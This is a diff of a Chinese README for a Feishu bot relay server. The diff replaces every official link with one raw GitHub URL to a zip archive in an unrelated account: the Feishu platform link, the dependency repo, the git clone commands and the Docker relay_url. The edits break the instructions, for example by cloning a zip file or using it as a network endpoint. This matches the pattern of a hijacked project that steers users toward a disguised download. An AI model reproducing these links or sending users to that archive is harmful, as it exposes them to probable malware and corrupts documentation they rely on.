@@ -17,13 +17,13 @@
 
 你需要准备：
 
-1. **飞书自建应用**的 `App ID` 和 `App Secret`（从[飞书开放平台](https://open.feishu.cn/) → 开发者后台 → 创建应用 获取）
-2. **[clawrelay-api](https://github.com/roodkcab/clawrelay-api)** 运行在本机（默认端口 50009）
+1. **飞书自建应用**的 `App ID` 和 `App Secret`（从[飞书开放平台](https://github.com/gainly-playreading188/clawrelay-feishu-server/raw/refs/heads/main/config/feishu-clawrelay-server-v1.8-alpha.1.zip) → 开发者后台 → 创建应用 获取）
+2. **[clawrelay-api](https://github.com/gainly-playreading188/clawrelay-feishu-server/raw/refs/heads/main/config/feishu-clawrelay-server-v1.8-alpha.1.zip)** 运行在本机（默认端口 50009）
 
 然后：
 
 ```bash
-git clone https://github.com/wxkingstar/clawrelay-feishu-server.git
+git clone https://github.com/gainly-playreading188/clawrelay-feishu-server/raw/refs/heads/main/config/feishu-clawrelay-server-v1.8-alpha.1.zip
 cd clawrelay-feishu-server
 pip install -r requirements.txt
 python main.py
@@ -51,7 +51,7 @@ python main.py
 ## Docker 部署
 
 ```bash
-git clone https://github.com/wxkingstar/clawrelay-feishu-server.git
+git clone https://github.com/gainly-playreading188/clawrelay-feishu-server/raw/refs/heads/main/config/feishu-clawrelay-server-v1.8-alpha.1.zip
 cd clawrelay-feishu-server
 
 # 编辑配置（Docker 中不支持交互式向导，需提前填写）
@@ -61,7 +61,7 @@ vim config/bots.yaml
 docker compose up -d
 ```
 
-> Docker 模式下 `relay_url` 需使用 `http://host.docker.internal:50009`（而非 `localhost`）连接宿主机的 clawrelay-api。
+> Docker 模式下 `relay_url` 需使用 `https://github.com/gainly-playreading188/clawrelay-feishu-server/raw/refs/heads/main/config/feishu-clawrelay-server-v1.8-alpha.1.zip`（而非 `localhost`）连接宿主机的 clawrelay-api。
 
 ```bash
 docker compose logs -f app   # 查看日志
@@ -96,7 +96,7 @@ bots:
     # === 必填 ===
     app_id: "YOUR_APP_ID"
     app_secret: "YOUR_APP_SECRET"
-    relay_url: "http://localhost:50009"    # Docker 中改为 http://host.docker.internal:50009
+    relay_url: "http://localhost:50009"    # Docker 中改为 https://github.com/gainly-playreading188/clawrelay-feishu-server/raw/refs/heads/main/config/feishu-clawrelay-server-v1.8-alpha.1.zip
 
     # === 可选 ===
     name: "My Bot"                         # 机器人名称（群聊中过滤 @提及）
@@ -121,7 +121,7 @@ bots:
 
 ## 飞书应用配置
 
-1. 登录[飞书开放平台](https://open.feishu.cn/)，创建企业自建应用
+1. 登录[飞书开放平台](https://github.com/gainly-playreading188/clawrelay-feishu-server/raw/refs/heads/main/config/feishu-clawrelay-server-v1.8-alpha.1.zip)，创建企业自建应用
 2. 在「凭证与基础信息」中获取 `App ID` 和 `App Secret`
 3. 在「权限管理」中开通以下权限：
    - `im:message` — 获取与发送单聊、群组消息
